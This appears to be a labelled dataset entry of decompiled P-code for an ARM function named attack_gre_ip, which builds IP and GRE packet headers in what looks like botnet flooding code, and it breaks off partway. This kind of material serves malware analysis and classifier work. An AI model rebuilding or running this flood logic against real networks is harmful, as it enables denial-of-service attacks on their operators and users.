Label: 848
Function: attack_gre_ip
Architecture: arm
Source File: Unknown
Entry Point: 000151b0

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x10000348, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x3d, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x633, 4)
(register, 0x2c, 4) PTRADD (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffa4, 4) , (const, 0x4, 4)
(unique, 0x10000354, 4) LOAD (const, 0x1a1, 4) , (register, 0x2c, 4)
(register, 0x2c, 4) CAST (unique, 0x10000354, 4)
(unique, 0x10000358, 4) PTRADD (register, 0x2c, 4) , (const, 0x1, 4) , (const, 0x14, 4)
(register, 0x2c, 4) CAST (unique, 0x10000358, 4)
(unique, 0x1000019b, 4) PTRADD (register, 0x2c, 4) , (const, 0x1, 4) , (const, 0x14, 4)
(unique, 0x1000035c, 4) PTRSUB (unique, 0x1000019b, 4) , (const, 0x4, 4)
(register, 0x2c, 4) CAST (unique, 0x1000035c, 4)
(unique, 0x100001a3, 4) PTRADD (register, 0x2c, 4) , (const, 0x2, 4) , (const, 0x14, 4)
(unique, 0x10000360, 4) PTRSUB (unique, 0x100001a3, 4) , (const, 0x4, 4)
(register, 0x2c, 4) CAST (unique, 0x10000360, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x10000364, 4)
(unique, 0x10000364, 4) CAST (register, 0x2c, 4)
(register, 0x2c, 1) INT_AND (unique, 0x43980, 1) , (const, 0x4f, 1)
(register, 0x2c, 1) INT_OR (register, 0x2c, 1) , (const, 0x40, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x10000368, 4) , (register, 0x2c, 1)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x69c, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x69c, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x69c, 4)
(unique, 0x10000368, 4) CAST (register, 0x2c, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x1000036c, 4)
(unique, 0x1000036c, 4) CAST (register, 0x2c, 4)
(register, 0x2c, 1) INT_AND (unique, 0x43980, 1) , (const, 0xf5, 1)
(register, 0x2c, 1) INT_OR (register, 0x2c, 1) , (const, 0x5, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x10000370, 4) , (register, 0x2c, 1)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x6bd, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x6bd, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x6bd, 4)
(unique, 0x10000370, 4) CAST (register, 0x2c, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (stack, 0xffffffffffffffeb, 1)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x6c5, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x6c5, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x6c5, 4)
(unique, 0x8280, 4) PTRSUB (register, 0x2c, 4) , (const, 0x1, 4)
(unique, 0x3b00, 4) INT_AND (stack, 0xffffffffffffffdc, 4) , (const, 0xffff, 4)
(register, 0x2c, 4) INT_ADD (unique, 0x3b00, 4) , (const, 0x34, 4)
(unique, 0x3580, 4) INT_MULT (register, 0x2c, 4) , (const, 0x10000, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (register, 0x20, 2)
(register, 0x20, 2) SUBPIECE (unique, 0x10000334, 4) , (const, 0x0, 4)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x6fe, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x6fe, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (register, 0x2c, 4) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (register, 0x2c, 4) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (register, 0x2c, 4) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (register, 0x2c, 4) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x6fe, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x6fe, 4)
(unique, 0x10000334, 4) INT_RIGHT (unique, 0x3580, 4) , (const, 0x10, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x705, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x705, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x705, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0x2, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (stack, 0xffffffffffffffe8, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x70b, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x70b, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x70b, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x70b, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x70b, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x70b, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x70b, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x70b, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x70b, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x70b, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x70b, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x70b, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x70b, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x70b, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x70b, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x70b, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x70b, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x70b, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x70b, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x70b, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x712, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x712, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x712, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0x4, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (stack, 0xffffffffffffffe7, 1)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x71a, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x71a, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x71a, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0x8, 4)
(register, 0x65, 1) INT_NOTEQUAL (stack, 0xffffffffffffffe6, 1) , (const, 0x0, 1)
 ---  CBRANCH (ram, 0x1547c, 1) , (register, 0x65, 1)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (const, 0x4000, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x73c, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x73c, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x73c, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x73c, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x73c, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x73c, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x73c, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x73c, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x73c, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x73c, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x73c, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x73c, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x73c, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x73c, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x73c, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x73c, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x73c, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x73c, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x73c, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x73c, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x743, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x743, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x743, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0x6, 4)
(ram, 0x15a00, 4) MULTIEQUAL (ram, 0x15a00, 4) , (ram, 0x15a00, 4)
(ram, 0x15a04, 4) MULTIEQUAL (ram, 0x15a04, 4) , (ram, 0x15a04, 4)
(ram, 0x15a08, 4) MULTIEQUAL (ram, 0x15a08, 4) , (ram, 0x15a08, 4)
(stack, 0xffffffffffffffa4, 4) MULTIEQUAL (stack, 0xffffffffffffffa4, 4) , (stack, 0xffffffffffffffa4, 4)
(stack, 0xffffffffffffffa8, 4) MULTIEQUAL (stack, 0xffffffffffffffa8, 4) , (stack, 0xffffffffffffffa8, 4)
(stack, 0xffffffffffffffac, 4) MULTIEQUAL (stack, 0xffffffffffffffac, 4) , (stack, 0xffffffffffffffac, 4)
(stack, 0xffffffffffffffb0, 4) MULTIEQUAL (stack, 0xffffffffffffffb0, 4) , (stack, 0xffffffffffffffb0, 4)
(stack, 0xffffffffffffffb4, 4) MULTIEQUAL (stack, 0xffffffffffffffb4, 4) , (stack, 0xffffffffffffffb4, 4)
(stack, 0xffffffffffffffd0, 4) MULTIEQUAL (stack, 0xffffffffffffffd0, 4) , (stack, 0xffffffffffffffd0, 4)
(stack, 0xffffffffffffffd4, 4) MULTIEQUAL (stack, 0xffffffffffffffd4, 4) , (stack, 0xffffffffffffffd4, 4)
(stack, 0xffffffffffffffda, 1) MULTIEQUAL (stack, 0xffffffffffffffda, 1) , (stack, 0xffffffffffffffda, 1)
(stack, 0xffffffffffffffdb, 1) MULTIEQUAL (stack, 0xffffffffffffffdb, 1) , (stack, 0xffffffffffffffdb, 1)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe2, 2) MULTIEQUAL (stack, 0xffffffffffffffe2, 2) , (stack, 0xffffffffffffffe2, 2)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe6, 1) MULTIEQUAL (stack, 0xffffffffffffffe6, 1) , (stack, 0xffffffffffffffe6, 1)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 2) MULTIEQUAL (stack, 0xffffffffffffffe8, 2) , (stack, 0xffffffffffffffe8, 2)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (const, 0x2f, 1)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x754, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x754, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x754, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0x9, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x100001c7, 4) , (stack, 0xffffffffffffffd4, 4)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x75a, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x75a, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x75a, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xc, 4)
(unique, 0x100001c7, 4) PTRSUB (unique, 0x10000374, 4) , (const, 0x0, 4)
(unique, 0x10000374, 4) PTRSUB (unique, 0x8280, 4) , (const, 0x0, 4)
(register, 0x28, 4) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x100001cf, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffffa4, 4) , (const, 0x18, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x100001cf, 4) , (const, 0x10, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x28, 4)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x787, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x787, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x787, 4)
(unique, 0x100001d7, 4) PTRSUB (stack, 0xffffffffffffffb4, 4) , (const, 0xc, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x10000378, 4) , (const, 0x4, 4)
(unique, 0x10000378, 4) PTRSUB (unique, 0x100001d7, 4) , (const, 0x0, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (const, 0x800, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x795, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x795, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x795, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x795, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x795, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x795, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x795, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x795, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x795, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x795, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x795, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x795, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x795, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x795, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x795, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x795, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x795, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x795, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x795, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x795, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x79c, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x79c, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x79c, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffb0, 4) , (const, 0x2, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x1000037c, 4)
(unique, 0x1000037c, 4) CAST (stack, 0xffffffffffffffac, 4)
(register, 0x2c, 1) INT_AND (unique, 0x43980, 1) , (const, 0x4f, 1)
(register, 0x2c, 1) INT_OR (register, 0x2c, 1) , (const, 0x40, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x10000380, 4) , (register, 0x2c, 1)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x7bd, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x7bd, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x7bd, 4)
(unique, 0x10000380, 4) CAST (stack, 0xffffffffffffffac, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x10000384, 4)
(unique, 0x10000384, 4) CAST (stack, 0xffffffffffffffac, 4)
(register, 0x2c, 1) INT_AND (unique, 0x43980, 1) , (const, 0xf5, 1)
(register, 0x2c, 1) INT_OR (register, 0x2c, 1) , (const, 0x5, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x10000388, 4) , (register, 0x2c, 1)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x7de, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x7de, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x7de, 4)
(unique, 0x10000388, 4) CAST (stack, 0xffffffffffffffac, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (stack, 0xffffffffffffffeb, 1)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x7e6, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x7e6, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x7e6, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffac, 4) , (const, 0x1, 4)
(unique, 0x3b00, 4) INT_AND (stack, 0xffffffffffffffdc, 4) , (const, 0xffff, 4)
(register, 0x2c, 4) INT_ADD (unique, 0x3b00, 4) , (const, 0x1c, 4)
(unique, 0x3580, 4) INT_MULT (register, 0x2c, 4) , (const, 0x10000, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (register, 0x20, 2)
(register, 0x20, 2) SUBPIECE (unique, 0x10000338, 4) , (const, 0x0, 4)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x81f, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x81f, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x81f, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x81f, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x81f, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x81f, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x81f, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x81f, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x81f, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x81f, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x81f, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x81f, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x81f, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x81f, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x81f, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x81f, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x81f, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x81f, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x81f, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x81f, 4)
(unique, 0x10000338, 4) INT_RIGHT (unique, 0x3580, 4) , (const, 0x10, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x826, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x826, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x826, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffac, 4) , (const, 0x2, 4)
(register, 0x2c, 2) INT_NEGATE (stack, 0xffffffffffffffe8, 2)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (register, 0x2c, 2)
(ram, 0x15a00, 4) INDIRECT (ram, 0x15a00, 4) , (const, 0x846, 4)
(ram, 0x15a04, 4) INDIRECT (ram, 0x15a04, 4) , (const, 0x846, 4)
(ram, 0x15a08, 4) INDIRECT (ram, 0x15a08, 4) , (const, 0x846, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x846, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x846, 4)
(stack, 0xffffffffffffffac, 4) INDIRECT (stack, 0xffffffffffffffac, 4) , (const, 0x846, 4)
(stack, 0xffffffffffffffb0, 4) INDIRECT (stack, 0xffffffffffffffb0, 4) , (const, 0x846, 4)
(stack, 0xffffffffffffffb4, 4) INDIRECT (stack, 0xffffffffffffffb4, 4) , (const, 0x846, 4)
(stack, 0xffffffffffffffd0, 4) INDIRECT (stack, 0xffffffffffffffd0, 4) , (const, 0x846, 4)
(stack, 0xffffffffffffffd4, 4) INDIRECT (stack, 0xffffffffffffffd4, 4) , (const, 0x846, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x846, 4)
